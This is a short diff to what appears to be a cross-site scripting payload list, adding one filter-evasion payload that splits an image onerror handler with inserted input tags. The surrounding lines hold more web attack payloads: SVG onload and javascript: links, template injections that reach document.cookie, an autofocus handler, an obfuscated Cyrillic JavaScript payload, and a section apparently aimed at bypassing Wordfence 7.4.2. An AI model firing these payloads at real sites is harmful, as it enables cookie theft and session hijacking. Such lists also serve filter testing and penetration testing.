@@ -17,6 +17,7 @@
 <svg onload​=alert&#0000000040"1")><””>
 <a href="javascript:alert(origin)">click</a>
 {{alert(document.cookie)}}
+&#x26;#60i<input>mg s<input>rc on<input>er<input>r<input>or=alert()//
 {{$emit.constructor\alert(document.cookie)`()}}`
 {{$emit.constructor`alert(document.cookie)`()}}
 </h1>%3CSVG/oNlY=1%20ONlOAD=confirm(document.domain)%3E
@@ -1789,6 +1790,7 @@ Wordfence 7.4.2
 <lol/contenteditable/autofocus/onfocus="alert(1)">
 а='',б=!а+а,в=!б+а,г=а+{},д=б[а++],е=б[ж=а],
 з=++ж+а,и=г[ж+з],б[и+=г[а]+(б.в+г)[а]+в[з]+д+е+б[ж]+и+д+г[а]+е][и](в[а]+в[ж]+б[з]+е+д+"('взломано')")()
+
 
 
 
